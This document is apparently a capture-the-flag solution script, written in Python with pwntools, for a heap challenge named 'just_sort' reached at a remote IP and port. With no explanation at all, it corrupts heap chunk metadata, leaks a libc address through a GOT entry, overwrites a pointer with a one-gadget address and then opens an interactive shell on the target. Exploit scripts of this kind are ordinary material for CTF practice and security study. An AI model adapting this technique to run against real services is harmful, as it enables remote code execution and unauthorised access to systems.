from pwn import *

#r = process(["./just_sort"])
r = remote("159.65.125.233", 6005)
def insert(size,memo):
	r.sendlineafter(">","1")
	r.sendlineafter(">",str(size))
	r.sendafter(">",memo)

def edit(id,pos,memo):
	r.sendlineafter(">","2")
	r.sendlineafter(">",str(id))
	r.sendlineafter(">",str(pos))
	r.sendlineafter(">",memo)

def show():
	r.sendlineafter(">","3")

def search(size,memo):
	r.sendlineafter(">","4")
	r.sendlineafter(">",str(size))
	r.sendafter(">",memo)

def remove(id,pos):
	r.sendlineafter(">","5")
	r.sendlineafter(">",str(id))
	r.sendlineafter(">",str(pos))

insert(0x28,"a")
remove(4,0)
insert(0x30,"a")
search(0x28,p64(0x0)*5+p64(0x21)+p64(0x0)+p64(0x602028))
show()
r.recvuntil("\"")
libc = u64(r.recvuntil("\"")[:-1].ljust(8,'\x00'))-0x6f690
print hex(libc)
insert(0x18,"a")
insert(0x18,"a")
insert(0x58,"a")
remove(2,1)
remove(8,0)
insert(0x60,"a")
search(0x18,p64(0x0)*3+p64(0x61)+p64(0x601ffa))
insert(0x58,"a")
insert(0x58,"a"*0xe+p64(libc+0x45390))


r.interactive()
